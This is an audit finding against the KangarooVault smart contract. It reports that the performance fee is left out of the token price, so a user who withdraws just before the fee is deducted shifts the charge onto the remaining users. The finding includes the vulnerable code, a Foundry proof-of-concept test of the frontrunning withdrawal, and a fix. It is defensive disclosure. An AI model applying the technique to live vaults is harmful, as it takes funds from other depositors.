[H-05] Uneven deduction of performance fee causes some KangarooVault users to lose part of their token value
Submitted bypeakbolt
InKangarooVault._resetTrade(), aperformanceFeeis charged upon closing of all positions, on thepremiumCollected. This is inconsistent withgetTokenPrice()aspremiumCollectedis factored in the token price computation, while theperformanceFeeis not. This leads to an uneven distribution of theperformanceFeefor theKangarooVaultusers.
Impact
That means a user can evade theperformanceFeeand steal some of the funds from the rest by triggeringprocessWithdraw()before theperformanceFeeis deducted fromKangarooVault. The remaining users will be shortchanged and lose part of their token value as they bear the charges from the performance fee.
Detailed Explanation
When all positions inKangarooVaultare closed,_resetTrade()is triggered, which will proceed to deduct aperformanceFeefrom thepremiumCollected.
function _resetTrade() internal {positionData.positionId = 0;(uint256 totalMargin,) = PERP_MARKET.remainingMargin(address(this));PERP_MARKET.transferMargin(-int256(totalMargin));usedFunds -= totalMargin;uint256 fees = positionData.premiumCollected.mulWadDown(performanceFee);if (fees > 0) SUSD.safeTransfer(feeReceipient, fees);totalFunds += positionData.premiumCollected - fees;totalFunds -= usedFunds;positionData.premiumCollected = 0;positionData.totalMargin = 0;usedFunds = 0;}
KangarooVault.sol#L788-L789
However, onlypremiumCollectedis factored in thegetTokenPrice()computation but not theperformanceFee. That means the premiums are distributed among the users via token price, while the performance fee is not.
function getTokenPrice() public view returns (uint256) {if (totalFunds == 0) {return 1e18;}uint256 totalSupply = getTotalSupply();if (positionData.positionId == 0) {return totalFunds.divWadDown(totalSupply);}uint256 totalMargin;(uint256 markPrice, bool isInvalid) = EXCHANGE.getMarkPrice();require(!isInvalid);(totalMargin, isInvalid) = PERP_MARKET.remainingMargin(address(this));require(!isInvalid);uint256 totalValue = totalFunds + positionData.premiumCollected + totalMargin + positionData.totalCollateral;totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount));return totalValue.divWadDown(totalSupply);}
KangarooVault.sol#L358-L359
Proof of Concept
Add the following imports and test case totest/KangarooVault.t.sol
import {IVaultToken} from "../src/interfaces/IVaultToken.sol";function testKangarooPerformanceFee() public {uint256 amt = 231e18;IVaultToken vaultToken = IVaultToken(kangaroo.VAULT_TOKEN());// deposit equal value for both user_2 and user 3 into KangarooVaultuint256 depositAmt = 10e18;susd.mint(user_2, depositAmt);vm.startPrank(user_2);susd.approve(address(kangaroo), depositAmt);kangaroo.initiateDeposit(user_2, depositAmt);assertEq((vaultToken.balanceOf(user_2) * kangaroo.getTokenPrice())/1e18, depositAmt);vm.stopPrank();susd.mint(user_3, depositAmt);vm.startPrank(user_3);susd.approve(address(kangaroo), depositAmt);kangaroo.initiateDeposit(user_3, depositAmt);assertEq((vaultToken.balanceOf(user_2) * kangaroo.getTokenPrice())/1e18, depositAmt);vm.stopPrank();skip(14500);kangaroo.processDepositQueue(2);// Open position at KangarooVault and execute the orderskangaroo.openPosition(amt, 0);skip(100);kangaroo.executePerpOrders(emptyData);kangaroo.clearPendingOpenOrders(0);// Simulate price drop to trigger profit from premium collectionsetAssetPrice(initialPrice - 100e18);// initiate withdrawal for both user_2 and user_3vm.prank(user_2);kangaroo.initiateWithdrawal(user_2, depositAmt);vm.prank(user_3);kangaroo.initiateWithdrawal(user_3, depositAmt);skip(14500);// close all position with gain from premium collectionkangaroo.closePosition(amt, 1000000e18);skip(100);kangaroo.executePerpOrders(emptyData);// user_2 frontrun clearPendingCloseOrders() to withdraw at higher token pricekangaroo.processWithdrawalQueue(1);assertEq(vaultToken.balanceOf(user_2), 0);assertEq(susd.balanceOf(user_2), 9693821343146274141);// This will trigger resetTrade and deduct performance Feekangaroo.clearPendingCloseOrders(0);// user_3's withdrawal was processed but at a lower token pricekangaroo.processWithdrawalQueue(1);assertEq(vaultToken.balanceOf(user_3), 0);assertEq(susd.balanceOf(user_3),9655768088211372841);// This shows that user_3 was shortchanged and lost part of token value,// despite starting with equal token balanceassertGt(susd.balanceOf(user_2), susd.balanceOf(user_3));}
Recommended Mitigation Steps
Consider changing the following inKangarooVault.sol#L359
totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount) );
to
totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount) + positionData.premiumCollected.mulWadDown(performanceFee));
mubaris (Polynomial) confirmed